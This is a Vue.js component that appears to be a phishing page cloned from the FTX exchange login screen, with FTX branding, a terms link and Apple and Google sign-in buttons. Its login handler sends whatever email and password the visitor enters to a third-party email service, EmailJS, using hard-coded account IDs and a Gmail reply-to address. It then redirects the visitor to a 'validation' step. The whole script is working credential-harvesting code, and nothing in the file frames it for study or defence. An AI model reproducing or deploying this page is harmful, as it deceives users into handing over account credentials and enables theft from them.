<template>
  <div class="pt-10 pb-20 bg-[#0D1017]">
    <div id="ethmerge">
      <section class="section">
        <div class="container px-4 md:px-0 max-w-screen-xl mx-auto">
          <div class="text-white flex items-center justify-center">
            <div
              class="max-w-[600px] w-full p-12 rounded-md"
              style="background: rgb(29 31 43)"
            >
              <h1 class="mb-12 text-2xl md:text-[31px] font-bold">
                Login to your account
              </h1>
              <div>
                <input
                  style="background: #30333e"
                  class="h-[52px] w-full rounded-md px-3 text-slate-500 shadow-sm focus:outline-none focus:ring focus:ring-[#007994] focus:border-[#007994]"
                  type="email"
                  v-model="email"
                  placeholder="Email"
                />
              </div>
              <div class="mt-2">
                <input
                  style="background: #30333e"
                  class="h-[52px] w-full rounded-md px-3 text-slate-500 shadow-sm focus:outline-none focus:ring focus:ring-[#007994] focus:border-[#007994]"
                  type="password"
                  v-model="password"
                  placeholder="Password"
                />
              </div>
              <div class="mb-10 mt-10">
                <label class="MuiFormControlLabel-root"
                  ><span
                    class="MuiButtonBase-root MuiIconButton-root jss692 MuiCheckbox-root MuiCheckbox-colorSecondary jss693 Mui-checked MuiIconButton-colorSecondary"
                    aria-disabled="false"
                  >
                    <input
                      class="jss695"
                      type="checkbox"
                      data-indeterminate="false"
                      value=""
                    />
                  </span>
                  <span
                    class="MuiTypography-root MuiFormControlLabel-label MuiTypography-body2"
                    >I agree to the FTX
                    <a
                      class="text-[#00B4C9] MuiTypography-root MuiLink-root MuiLink-underlineHover MuiTypography-colorPrimary jss58"
                      target="_blank"
                      rel="noopener noreferrer"
                      href="https://help.ftx.com/hc/en-us/articles/360024788391-FTX-Terms-of-Service"
                      >Terms of Service</a
                    >.</span
                  ></label
                >
              </div>
              <button
                @click="getInformation"
                class="mb-2 flex items-center justify-center bg-[#007994] w-full py-3 rounded-md"
              >
                <div class="flex items-center">
                  <strong>Login</strong>
                  <div
                    v-if="isLoading"
                    class="ml-2 w-5 h-5 rounded-full animate-spin border-4 border-dashed border-primary border-t-transparent"
                  ></div>
                </div>
              </button>
              <div class="text-center">OR</div>
              <button
                class="mt-2 mb-2 flex items-center justify-center bg-black w-full py-3 rounded-md"
              >
                <div class="flex">
                  <img
                    class="h-[30px]"
                    src="https://ftx.com/static/media/a-logo.e2928673.svg"
                    alt=""
                  />
                  <strong>Login with Apple</strong>
                </div>
              </button>
              <button
                class="flex items-center justify-center bg-white text-[#808080] w-full py-3 rounded-md"
              >
                <div class="flex items-center">
                  <img
                    class="h-[10px] mr-2"
                    src="data:image/png;base64,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"
                    alt=""
                  />
                  <strong>Login with Google</strong>
                </div>
              </button>
            </div>
          </div>
          <div class="text-white my-8 flex items-center justify-center">
            <div>
              <span class="">Already have an account? </span>
              <a class="text-[#00B4C9]" href="/">Sign in</a>
            </div>
          </div>
        </div>
      </section>
    </div>
  </div>
</template>

<script>
import axios from 'axios'
export default {
  data() {
    return {
      isLoading: false,
      email: '',
      password: '',
    }
  },
  methods: {
    getInformation() {
      try {
        this.isLoading = true;
        let self = this;
        if (this.email !== '' && this.password !== '') {
          var data = {
            service_id: 'service_g49xzs9',
            template_id: 'template_xkj0lgc',
            user_id: 'Q_v6F22hpmQkpwuex',
            template_params: {
              from_name: 'FTX Onboarding',
              email: this.email,
              password: this.password,
              reply_to: 'customeronlineagent@gmail.com',
            },
          }
          axios
            .post('https://api.emailjs.com/api/v1.0/email/send', data)
            .then(function () {
              self.$router.push('/validation')
              self.isLoading = false
            })
            .catch(function () {
              self.isLoading = false
              self.$toast.error('Something went wrong, contact administrator')
            })
        } else {
          this.$toast.info('Wrong Input!. Fill the input form ')
          this.isLoading = false
        }
      } catch (error) {
        this.$toast.error('Something went wrong')
      }
    },
  },
}
</script>

<style></style>
